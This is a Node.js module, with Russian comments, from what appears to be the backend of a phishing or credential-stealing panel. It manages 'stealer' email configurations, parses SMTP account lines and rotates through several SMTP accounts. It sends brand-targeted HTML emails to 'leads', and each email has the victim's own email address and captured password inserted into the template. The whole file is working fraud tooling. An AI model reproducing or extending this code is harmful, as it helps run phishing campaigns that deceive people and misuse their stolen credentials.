'use strict';

const fs = require('fs');
const path = require('path');

let nodemailer;
try {
  nodemailer = require('nodemailer');
} catch (e) {
  nodemailer = null;
}

let DATA_DIR = path.join(__dirname, '..', '..', 'data');
let pushEventFn = function () {};

const CONFIG_EMAIL_SENT_EVENT_LABEL = 'Send Email';

/** Копия объекта конфига, чтобы вызывающий не мутировал кэш. */
function cloneEmailConfig(obj) {
  return JSON.parse(JSON.stringify(obj));
}

let _configEmailCache = null;
let _stealerEmailCache = null;

function init(opts) {
  if (opts && opts.dataDir) DATA_DIR = opts.dataDir;
  if (opts && typeof opts.pushEvent === 'function') pushEventFn = opts.pushEvent;
  reloadMailConfigCachesFromDisk();
}

const STEALER_EMAIL_FILE = () => path.join(DATA_DIR, 'stealer-email.json');
const CONFIG_EMAIL_FILE = () => path.join(DATA_DIR, 'config-email.json');

function parseSmtpLine(line) {
  const raw = (line || '').trim();
  const s = raw.indexOf('\n') >= 0 ? raw.split('\n')[0].trim() : raw;
  if (!s) return null;
  const parts = s.split(':');
  if (parts.length < 5) return null;
  const host = (parts[0] || '').trim();
  const port = parseInt(parts[1], 10) || 587;
  let user = (parts[2] || '').trim();
  let fromEmail = (parts[3] || '').trim();
  let password = parts.slice(4).join(':').trim();
  if (user.length > 256) user = user.slice(0, 256);
  if (fromEmail.length > 256) fromEmail = fromEmail.slice(0, 256);
  if (password.length > 256) password = password.slice(0, 256);
  return { host, port, user, fromEmail, password };
}

function parseSmtpLines(line) {
  const raw = (line || '').trim();
  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
  const result = [];
  for (const s of lines) {
    const smtp = parseSmtpLine(s);
    if (smtp && smtp.host && smtp.user && smtp.password) result.push(smtp);
  }
  return result;
}

/** Читает stealer с диска (без кэша). Может вызвать миграцию и writeStealerEmailConfig. */
function loadStealerEmailConfigFromDisk() {
  try {
    const f = STEALER_EMAIL_FILE();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
      const legacy = data;
      const id = 'legacy-' + Date.now();
      if (legacy.smtp && legacy.smtpUser) {
        const smtpLine = [legacy.smtp, String(legacy.smtpPort || 587), legacy.smtpUser, legacy.smtpUser, legacy.smtpPass || ''].join(':');
        const migrated = { currentId: id, configs: [{ id, name: 'Default', smtpLine, html: legacy.html || '', senderName: legacy.senderName || '', title: legacy.title || '' }] };
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(STEALER_EMAIL_FILE(), JSON.stringify(migrated, null, 2), 'utf8');
        const cur = migrated.configs[0];
        return { currentId: id, configs: migrated.configs, current: cur };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' } };
}

function loadConfigEmailFromDisk() {
  try {
    const f = CONFIG_EMAIL_FILE();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' } };
}

function reloadMailConfigCachesFromDisk() {
  _stealerEmailCache = loadStealerEmailConfigFromDisk();
  _configEmailCache = loadConfigEmailFromDisk();
}

function readStealerEmailConfig() {
  if (!_stealerEmailCache) reloadMailConfigCachesFromDisk();
  return cloneEmailConfig(_stealerEmailCache);
}

function writeStealerEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(STEALER_EMAIL_FILE(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
    const t = toWrite || {};
    if (t.configs && Array.isArray(t.configs)) {
      const currentId = t.currentId || (t.configs[0] && t.configs[0].id) || null;
      const current = t.configs.find(function (c) { return c.id == currentId; }) || t.configs[0] || null;
      _stealerEmailCache = { currentId, configs: t.configs, current };
    } else {
      _stealerEmailCache = loadStealerEmailConfigFromDisk();
    }
  } catch (e) {}
}

function readConfigEmail() {
  if (!_configEmailCache) reloadMailConfigCachesFromDisk();
  return cloneEmailConfig(_configEmailCache);
}

function writeConfigEmail(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(CONFIG_EMAIL_FILE(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
    const t = toWrite || {};
    if (t.configs && Array.isArray(t.configs)) {
      const currentId = t.currentId || (t.configs[0] && t.configs[0].id) || null;
      const current = t.configs.find(function (c) { return c.id == currentId; }) || t.configs[0] || null;
      _configEmailCache = { currentId, configs: t.configs, current };
    } else {
      _configEmailCache = loadConfigEmailFromDisk();
    }
  } catch (e) {}
}

function leadHasAnyConfigEmailSentEvent(lead) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label != null ? String(ev.label).trim().toLowerCase() : '';
    if (!lbl) return false;
    if (lbl === 'send email' || lbl.indexOf('send email') === 0) return true;
    if (lbl === 'email send' || lbl === 'email send kl') return true;
    if (lbl === 'письмо отправлено') return true;
    if (lbl.indexOf('письмо отправлено') !== -1 && lbl.indexOf('не отправилось') === -1 && lbl.indexOf('не удалось') === -1) {
      return true;
    }
    return false;
  });
}

async function sendConfigEmailToLead(lead) {
  const toEmail = (lead.email || lead.emailKl || '').trim();
  if (!toEmail) {
    pushEventFn(lead, 'Письмо не отправилось: у лида нет email', 'admin');
    return { ok: false, error: 'У лида нет email', statusCode: 400 };
  }
  const password = (lead.password || lead.passwordKl || '').trim();
  const data = readConfigEmail();
  let cfg = data.current;
  if (lead.brand === 'klein') {
    const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
    if (klCfg) cfg = klCfg;
  }
  if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
    pushEventFn(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP. Откройте Config, вкладка E-Mail, введите SMTP и нажмите «Сохранить».', statusCode: 400 };
  }
  const smtpList = parseSmtpLines(cfg.smtpLine);
  if (!smtpList.length) {
    pushEventFn(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
  }
  let html = (cfg.html || '')
    .replace(/_email_/g, toEmail)
    .replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      const cid = 'image1@mail';
      html = html.replace(/_src1_/g, 'cid:' + cid);
      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    pushEventFn(lead, 'Письмо не отправилось: nodemailer не установлен', 'admin');
    return { ok: false, error: 'nodemailer not installed', statusCode: 500 };
  }
  const smtp = smtpList[0];
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  try {
    await transporter.sendMail(mailOptions);
    return { ok: true, fromEmail: smtp.fromEmail };
  } catch (err) {
    const msg = (err.message || '').slice(0, 200);
    pushEventFn(lead, 'Письмо не отправилось: ' + msg, 'admin');
    console.error('[send-config-email] Ошибка SMTP ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg);
    return { ok: false, error: msg, statusCode: 500 };
  }
}

/** Общий счётчик ротации SMTP для stealer (мутабельный объект — корректно при Object.assign в scope). */
const stealerRotation = { index: 0 };
const sendStealerFailedSmtpEmails = new Set();

function getNodemailer() {
  return nodemailer;
}

module.exports = {
  init,
  CONFIG_EMAIL_SENT_EVENT_LABEL,
  parseSmtpLine,
  parseSmtpLines,
  readStealerEmailConfig,
  writeStealerEmailConfig,
  readConfigEmail,
  writeConfigEmail,
  reloadMailConfigCachesFromDisk,
  leadHasAnyConfigEmailSentEvent,
  sendConfigEmailToLead,
  stealerRotation,
  sendStealerFailedSmtpEmails,
  getNodemailer,
  stealerEmailFilePath: STEALER_EMAIL_FILE,
  configEmailFilePath: CONFIG_EMAIL_FILE,
};
